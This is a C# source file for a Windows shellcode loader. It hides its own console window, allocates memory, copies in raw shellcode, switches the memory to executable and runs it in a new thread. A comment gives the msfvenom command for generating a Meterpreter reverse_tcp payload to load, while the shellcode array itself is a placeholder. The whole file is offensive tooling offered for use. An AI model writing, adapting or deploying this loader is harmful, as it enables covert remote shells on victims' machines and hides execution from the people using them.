using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Runtime.InteropServices;

namespace InjectLocalProcess
{
    public class Win32
    {
        [DllImport("kernel32")]
        public static extern UInt32 VirtualAlloc(UInt32 lpStartAddress, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 PAGE_EXECUTE_READ = 0x20;
        public static UInt32 PAGE_READWRITE = 0x04;
        public static int SW_HIDE = 0;
    }

    public class InjectLocalProcess
    {
        public static void RunShellcode(byte[] shellcode)
        {
            // Allocate memory with PAGE_READWRITE permissions
            UInt32 codeAddr = Win32.VirtualAlloc(0, (UInt32)shellcode.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
            
            // Copy the shellcode into the allocated memory
            Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

            // Change memory permissions to PAGE_EXECUTE_READ
            uint oldProtect;
            Win32.VirtualProtect((IntPtr)codeAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);

            // Execute the shellcode
            IntPtr threadHandle = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr parameter = IntPtr.Zero;
            threadHandle = Win32.CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
            
            // Wait for the thread to finish
            Win32.WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }

        static void Main(string[] args)
        {
            // Close the window
            var handle = Win32.GetConsoleWindow();
            Win32.ShowWindow(handle, Win32.SW_HIDE);

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread --smallest -f raw -o shellcode.bin
            byte[] shellcode = //new byte[<size>] { 0x75, 0x58, 0x6d, [...] };

            RunShellcode(shellcode);
        }
    }
}
